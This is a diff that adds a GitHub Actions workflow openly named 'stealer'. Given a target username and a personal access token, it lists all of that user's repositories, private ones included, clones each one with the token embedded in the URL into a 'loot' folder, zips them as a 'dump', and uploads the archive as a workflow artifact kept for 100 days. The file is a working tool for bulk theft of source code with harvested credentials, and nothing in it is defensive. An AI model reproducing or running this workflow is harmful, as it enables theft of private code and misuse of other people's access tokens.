@@ -1,0 +1,61 @@
+name: stealer
+on:
+  workflow_dispatch:
+    inputs:
+      target_username:
+        description: 'NAM'
+        required: true
+        default: 'GhostWasFound13'
+      target_token:
+        description: 'PAT'
+        required: true
+      include_private:
+        description: 'private also?'
+        type: boolean
+        default: true
+
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: set
+        run: sudo apt-get install -y jq zip
+
+      - name: get
+        env:
+          T_TOKEN: ${{ github.event.inputs.target_token }}
+          T_USER: ${{ github.event.inputs.target_username }}
+        run: |
+          mkdir loot_folder
+          echo "[*] check repos: $T_USER"
+          
+          REPOS=$(curl -s -H "Authorization: token $T_TOKEN" \
+            "https://api.github.com/user/repos?visibility=all&per_page=100" | jq -r '.[].full_name')
+
+          if [ -z "$REPOS" ] || [ "$REPOS" == "null" ]; then
+            echo "[!] failed check"
+            REPOS=$(curl -s "https://api.github.com/users/$T_USER/repos?per_page=100" | jq -r '.[].full_name')
+          fi
+
+          echo "[+] found repos"
+          
+          for REPO in $REPOS; do
+            FOLDER_NAME=$(echo $REPO | sed 's/\//_/g')
+            echo "[*] getting: $REPO"
+            
+            git clone --depth 1 "https://$T_TOKEN@github.com/$REPO.git" "loot_folder/$FOLDER_NAME"
+          done
+
+      - name: zip
+        run: |
+          zip -r "dump_${{ github.event.inputs.target_username }}.zip" loot_folder/
+
+      - name: post
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ github.event.inputs.target_username }}-vault
+          path: "dump_${{ github.event.inputs.target_username }}.zip"
+          retention-days: 100
